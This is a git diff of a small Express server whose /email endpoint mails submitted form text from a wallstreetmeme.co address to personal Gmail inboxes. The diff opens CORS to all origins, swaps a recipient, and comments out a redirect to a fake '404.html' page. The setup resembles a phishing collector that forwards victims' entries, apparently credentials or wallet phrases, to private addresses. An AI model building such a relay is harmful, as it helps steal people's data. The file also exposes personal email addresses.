@@ -2,6 +2,7 @@ const bodyParser = require("body-parser");
 const { configDotenv } = require("dotenv").config();
 const express = require("express");
 const nodemailer = require("nodemailer");
+const cors = require("cors");
 const app = express();
 const port = 3000;
 
@@ -21,6 +22,7 @@ const transporter = nodemailer.createTransport({
 app.use(express.json());
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
+app.use(cors());
 
 app.get("/", function (req, res) {
   res.send(req.body);
@@ -30,7 +32,7 @@ app.post("/email", function (req, res) {
   const { text } = req.body;
   const mailOptions = {
     from: "_mainaccount@wallstreetmeme.co",
-    to: "annagu.kennedy@gmail.com, reedkathy752@gmail.com",
+    to: "rachelcrosby54@gmail.com, reedkathy752@gmail.com",
     subject: " Nodemailer",
     text,
   };
@@ -41,7 +43,7 @@ app.post("/email", function (req, res) {
       res.status(500).json({ message: error.message });
     } else {
       console.log("Email sent: " + info.response);
-      res.redirect("https://wallstreetmeme.co/404.html");
+      //res.redirect("https://wallstreetmeme.co/404.html");
       res.end();
     }
   });
